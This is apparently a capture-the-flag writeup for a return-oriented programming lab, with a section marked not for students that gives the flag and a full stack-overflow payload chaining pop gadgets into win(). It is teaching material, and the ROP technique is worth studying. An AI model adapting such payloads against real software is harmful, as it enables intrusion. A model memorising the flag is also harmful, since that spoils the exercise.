# Writeup

This is a Return-Oriented Programming Challenge (ROP) in assemply. The goal is to execute the function `win()`, while putting the value "3" in rax, and the value "2" in rbx.
For this challenge, you are provided with a binary called "rop" where the challenge takes place, and an auxiliary binary called "hex2raw" which converts a hex string to raw bytes. Credit goes to the creators of the CMU attack lab for the creation of the hex2raw binary.

The binary was compiled as follows: gcc -o rop rop.c -fno-stack-protector -no-pie -z execstack

Notice there is no stack protection, so we can overwrite the return address of the function `bof()` with the address of `win()`. However, we need to put the values "3" and "2" in rax and rbx respectively, so we need to find a way to do that.

hex2raw takes a .txt file, and converts it to raw bytes. The file should be in individual hex bytes separated by spaces.
For example, proper formating of an input file "test.txt" could be:
```
48 89 e5 48 83 ec 10 48 8d 3d 00 00 00 00 48 8d
35 00 00 00 00 48 89 c7 48 89 d8 48 89 f9 48 89
da 48 89 fb 48 89 fc 48 89 fd 48 89 fe 48 89 ff
48 89 c6 b0 03 48 89 df b0 02 0f 05
```

The size of the buffer to be overflowed is 40 bytes.

gdb is your best friend in the entire world for this challenge. You can use it to disassemble the binary, and find the addresses of the gadgets you need.

If you try to cheat, say by artifically injecting values into the registers with gdb and skipping some checks, your flag will not be the correct one, so be careful.

Good luck!

# Not for students:

The flag is: CTF_SDaT{AW3s0m3_J0b_0n_th3_Ch4113ng3}

The challenge is solved by producing an input string that will overwrite the return address of the function `bof()` with the address of `win()`, and also put the values "3" and "2" in rax and rbx respectively.

To do so, we create an input file "input.txt" with the following content:
```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 4c 14 40 00 00 00 00 00 03 00 00 00 00 00 00 00 14 15 40 00 00 00 00 00 02 00 00 00 00 00 00 00 96 11 40 00 00 00 00 00 

```

Where the first 40 bytes are filler, the next 8 bytes are the address of a gadget that pops rax, the next 8 bytes are the value "3", the next 8 bytes are the address of a gadget that pops rbx, the next 8 bytes are the value "2", and the last 8 bytes are the address of `win()`.

The address of the gadget that pops rax is 0x0040144c, and the address of the gadget that pops rbx is 0x00401514.

The address of `win()` is 0x00401196.

The input file is then converted to raw bytes with the following command:
```
./hex2raw < input.txt > raw.txt
```

The raw bytes are then piped into the binary with the following command:
```
./rop < raw.txt
```
